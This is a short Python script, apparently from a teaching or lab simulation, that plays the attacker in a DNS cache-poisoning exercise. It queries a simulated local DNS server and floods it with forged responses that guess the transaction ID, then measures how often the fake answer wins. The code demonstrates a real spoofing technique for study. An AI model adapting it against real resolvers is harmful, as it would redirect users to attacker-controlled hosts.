"""
dns 응답을 기다릴 때(sleep으로 일단 구현) 위조 dns_rsp을 더 빨리 전송

"""

import socket 
from core.protocol import pack, unpack, create_txid
from core.config_utils import parse_config
from core.log_utils import get_logger

log = get_logger("attacker")

def main():
    target_url = "index.netplus.com/movie9"
    fake_answer = "abCDN.net/fake"
    burst = 3000
    trials = 10

    config = parse_config()
    local_dns_addr = config["local_dns_server"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    success_cnt = 0

    # attacker가 클라이언트인 척 하며 target_dns에 질의를 던짐
    # -> target_dns가 응답을 기다리는 상태가 됨 
    # 이때 가짜 응답을 전송하기
    for _ in range(trials):
        req_to_target = {
            "type": "dns_rqst",
            "url": target_url,
            "txid": create_txid(),
        }
        sock.sendto(pack(req_to_target), local_dns_addr)

        for _ in range(burst):
            attack_to_target = {
                "type": "dns_rsp",
                "url_echo": target_url,
                # target_dns가 만든 txid 모르기 때문에 그냥 임의로 찍기
                "txid_echo": create_txid(),
                "answer": fake_answer,
            }
            sock.sendto(pack(attack_to_target), local_dns_addr)

        answer = unpack(sock.recvfrom(4096)[0])["answer"]
        if "HQ" not in answer:
            success_cnt += 1        

    log.info(f"attack success rate: {success_cnt} / {trials}\n"
             f"{success_cnt / trials * 100:.1f}%"
             )
if __name__ == "__main__":
    main()